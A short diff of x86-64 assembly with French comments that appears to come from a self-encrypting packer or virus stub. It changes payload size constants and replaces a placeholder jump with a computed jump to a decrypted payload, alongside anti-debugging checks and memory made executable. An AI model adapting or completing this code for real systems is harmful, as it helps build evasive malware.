@@ -42,7 +42,7 @@ after_exit_5:
 	cmp eax, 0 ; syscalls
 	jg end_ft_end ; jg FOR DEBUG, jl FOR TRUE, je FOR REVERSE ; syscalls
     mov rdx, 0x7 ;EXEC | READ ; syscalls
-    mov rsi, 0x296f;|REPLACE1| size payload + 1 page ; syscalls
+    mov rsi, 0x29e7;|REPLACE1| size payload + 1 page ; syscalls
 ;
 	jmp after_exit_2
 	jmp2:
@@ -95,14 +95,15 @@ chiffrement_loop1_a:
 	cmp r13, 2 ; chiffrement & dechiffrement
 	je end_ft_end ; chiffrement & dechiffrement
 
-
-jmp 0xFFFFFFFF ; addresse du payload ; jmp_to_payload
+lea r13, [$ + 0xd]
+add r15, r13
+jmp r15 ; addresse du payload ; jmp_to_payload
 
 ft_end:
 mov r9, 8 ; NB_TIMING MOODULABLE ; dechiffrement
 mov r13, 2 ; mark this zone as end ; dechiffrement
 dechiffrement_loop2:
-	mov eax, 0x196f;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
+	mov eax, 0x19e7;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
 	shr eax, 2 ; dechiffrement & chiffrement
 ;
 	jmp after_exit_3
